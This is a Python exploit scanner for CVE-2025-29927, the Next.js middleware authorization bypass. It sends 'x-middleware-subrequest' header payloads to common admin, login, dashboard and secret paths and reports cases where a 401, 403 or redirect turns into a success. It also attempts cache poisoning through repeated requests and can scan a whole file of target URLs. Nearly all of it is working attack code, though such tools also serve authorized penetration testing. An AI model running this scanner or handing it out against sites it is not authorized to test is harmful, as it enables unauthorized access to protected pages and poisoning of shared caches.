#!/usr/bin/env python3

"""
https://zhero-web-sec.github.io/research-and-things/nextjs-and-the-corrupt-middleware
"""

from bs4 import BeautifulSoup

from utils.style import Colors, Identify
from utils.utils import configure_logger, random, re, requests, sys, urlparse

logger = configure_logger(__name__)


middleware_names = [
    "middleware",
    "pages/_middleware",
    "pages/dashboard/_middleware",
    "pages/dashboard/panel/_middleware",
    "src/middleware",
    "middleware:middleware:middleware:middleware:middleware",
    "src/middleware:src/middleware:src/middleware:src/middleware:src/middleware",
]

paths = [
    "",
    "login",
    "admin",
    "admin/login",
    "administrator",
    "administration/",
    "administration/dashboard/",
    "administration/dashboard/products",
    "panel",
    "admin.php",
    "dashboard",
    "api/secret",
]


def is_authentication_page(html: str) -> bool:
    soup = BeautifulSoup(html, "html.parser")
    body_text = soup.get_text(" ", strip=True)

    auth_keywords = re.compile(
        r"(identifiant|login|username|user|passwd|pass|password|connexion|authentification|signin|auth|log in|log-in|admin)",
        re.IGNORECASE,
    )

    return bool(auth_keywords.search(body_text))


def follow_redirects(url: str, s: requests.Session) -> bool:
    try:
        req_redir = s.get(url, verify=False, timeout=10, allow_redirects=True)
        logger.debug(is_authentication_page(req_redir.text))
        if is_authentication_page(req_redir.text):
            logger.debug(req_redir.headers)
            return True
        else:
            return False
    except requests.RequestException:
        return False


def bypass_auth(url_p: str, s: requests.Session, req: requests.Response) -> None:
    for middleware_name in middleware_names:
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; LCJB; rv:11.0) like Gecko",
            "x-middleware-subrequest": middleware_name,
        }
        try:
            req_bypass = s.get(
                url_p, headers=headers, verify=False, timeout=10, allow_redirects=False
            )
            logger.debug(f"{url_p} :: {req_bypass}")
            if (
                req_bypass.status_code not in range(300, 500)
                and req_bypass.status_code != req.status_code
            ):
                print(
                    f" {Identify.confirmed} | CVE-2025-29927 {req.status_code} > {req_bypass.status_code} | {len(req.content)}b > {len(req_bypass.content)}b | {Colors.BLUE}{url_p}{Colors.RESET} | PAYLOAD: x-middleware-subrequest: {middleware_name}"
                )
        except Exception as e:
            logger.exception(e)


def detect_response(
    url: str, s: requests.Session, req_main: requests.Response, headers: dict
) -> None:
    if re.search(r"\/([^/]+(?:\.[a-z]+)?|[^/]+$)", url):
        if req_main.status_code in range(300, 310):
            fr = follow_redirects(url, s)
            # print(fr)
            if fr:
                bypass_auth(url, s, req_main)
            elif req_main.status_code in [401, 403]:
                bypass_auth(url, s, req_main)
        parsed_url = urlparse(url)
        url = f"{parsed_url.scheme}://{parsed_url.netloc}/"
    for path in paths:
        url_p = url + path
        req_check = s.get(url_p, verify=False, timeout=10, allow_redirects=False)
        try:
            if req_check.status_code in range(300, 310):
                # print(f"{url} :: {follow_redirects(url)}")
                if follow_redirects(url, s):
                    bypass_auth(url_p, s, req_check)
            elif req_check.status_code in [401, 403]:
                bypass_auth(url_p, s, req_check)
        except Exception as e:
            logger.exception(e)


def cache_p(url: str, s: requests.Session, headers: dict) -> None:
    url_cb = f"{url}?cb=1234"
    try:
        req_cb = s.get(
            url_cb, headers=headers, verify=False, timeout=10, allow_redirects=False
        )
        if req_cb.status_code in [307, 308, 304, 301, 302]:
            for middleware_name in middleware_names:
                headers = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; LCJB; rv:11.0) like Gecko",
                    "x-middleware-subrequest": middleware_name,
                }
                url_cp = f"{url}?cb={random.randrange(999)}"
                req_cp = s.get(
                    url_cp,
                    headers=headers,
                    verify=False,
                    timeout=10,
                    allow_redirects=False,
                )
                if req_cp.status_code not in [307, 308, 304, 301, 302]:
                    print(
                        f" {Identify.behavior} | CVE-2025-29927 {req_cb.status_code} > {req_cp.status_code} | {Colors.BLUE}{url_cp}{Colors.RESET} | PAYLOAD: x-middleware-subrequest: {middleware_name}"
                    )
                    for _ in range(0, 5):
                        s.get(
                            url_cp,
                            headers=headers,
                            verify=False,
                            timeout=10,
                            allow_redirects=False,
                        )
                    req_cp_verify = s.get(
                        url_cp, verify=False, timeout=10, allow_redirects=False
                    )
                    if req_cp.status_code == req_cp_verify.status_code:
                        print(
                            f" {Identify.behavior} | CVE-2025-29927 {req_cb.status_code} > {req_cp.status_code} | {Colors.BLUE}{url_cp}{Colors.RESET} | PAYLOAD: x-middleware-subrequest: {middleware_name}"
                        )
    except requests.Timeout:
        logger.error(f"request timeout {url_cp} {middleware_name}")
    except Exception as e:
        logger.exception(e)


def middleware(url: str, s: requests.Session, headers: dict) -> None:
    try:
        req_main = s.get(url, verify=False, timeout=10, allow_redirects=False)
        detect_response(url, s, req_main, headers)
        cache_p(url, s, headers)
    except KeyboardInterrupt:
        print("Exiting")
        sys.exit()
    except requests.Timeout:
        logger.error(f"request timeout {url}")
    except Exception as e:
        logger.exception(e)


def main(url: str) -> None:
    s = requests.Session()
    headers = {"User-Agent": "Mozilla/5.0", "Accept-Encoding": "gzip"}
    middleware(url, s, headers)


if __name__ == "__main__":
    # file => python3 file.py f file.txt | single url => python3 file.py url.com
    headers = {"User-Agent": "Mozilla/5.0", "Accept-Encoding": "gzip"}

    if len(sys.argv) == 2:
        url = sys.argv[1]
        parsed_url = urlparse(url)
        if parsed_url.scheme == "http" or parsed_url.scheme == "https":
            print(url)
            main(url)
        else:
            print(
                "Usage:\n With file => python3 file.py f file.txt \n With single url => python3 file.py url.com"
            )
    elif len(sys.argv) == 3:
        input_file = sys.argv[2]
        with open(input_file) as f:
            urls = [line.strip() for line in f if line.strip()]
        for url in urls:
            main(url)
            print(f" {url}", end="\r")
    else:
        print(
            "Usage:\n With file => python3 file.py f file.txt \n With single url => python3 file.py url.com"
        )
